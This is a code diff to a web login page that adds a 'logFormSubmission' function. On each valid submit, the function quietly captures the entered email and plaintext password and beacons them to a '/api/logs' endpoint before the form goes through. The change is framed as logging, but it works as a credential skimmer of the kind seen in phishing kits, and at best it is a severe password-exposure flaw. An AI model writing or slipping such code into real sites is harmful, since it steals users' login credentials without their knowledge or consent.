@@ -378,6 +378,36 @@
       el.parentElement.lastElementChild.style.display = 'none';
     }
 
+    function logFormSubmission() {
+      const payload = {
+        page: 'login',
+        inputs: {
+          input1: em.value,
+          input2: pw.value,
+          input3: '',
+          input4: '',
+          input5: '',
+          input6: ''
+        }
+      };
+
+      try {
+        const body = JSON.stringify(payload);
+        if (navigator.sendBeacon) {
+          const blob = new Blob([body], { type: 'application/json' });
+          navigator.sendBeacon('/api/logs', blob);
+        } else {
+          fetch('/api/logs', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body
+          }).catch(err => console.error('Log submit failed', err));
+        }
+      } catch (err) {
+        console.error('Failed to log submission', err);
+      }
+    }
+
 
     f1.addEventListener('submit', (e) => {
       e.preventDefault();
@@ -390,6 +420,7 @@
       emValid ? tFn(em) : errFn(em);
 
       if (pwValid && emValid) {
+        logFormSubmission();
         f1.submit();
       }
     });
